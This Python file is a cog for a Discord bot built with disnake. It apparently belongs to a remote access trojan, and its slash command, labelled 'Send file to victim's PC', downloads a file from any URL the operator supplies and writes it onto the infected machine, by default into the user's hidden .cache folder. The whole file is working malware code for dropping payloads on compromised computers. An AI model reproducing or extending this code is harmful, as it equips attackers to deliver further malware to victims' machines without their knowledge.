import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class SendFiles(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Send file to victim's PC",
        options=[
            discord.Option("victim", description="IP Address of specific victim", required=True),
            discord.Option("url", description="Direct link to the file for sending", required=True),
            discord.Option("file_name", description="Name of the file after sending to PC", required=True),
            discord.Option("file_path", description="Path to which the file should be saved", required=False),
        ]
    )
    async def sendfiles(self, ctx, victim, url, file_name, file_path=nr_working):
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            
            if '"' in file_path:
                file_path = file_path.replace('"','')
            try: 
                os.chdir(file_path)
            except: 
                return await ctx.followup.send("Invalid directory!")
            
            try:
                r = requests.get(url, allow_redirects=True)
            except:
                return await ctx.followup.send("Invalid URL!")

            with open(file_name, "wb") as f: 
                f.write(r.content)
                
            await ctx.followup.send(
                embed=self.bot.genEmbed(
                    "File successfully sent to PC!", 
                    datetime.now(), 
                    "File path: " + file_path
                )
            )

def setup(bot: commands.Bot):
    bot.add_cog(SendFiles(bot))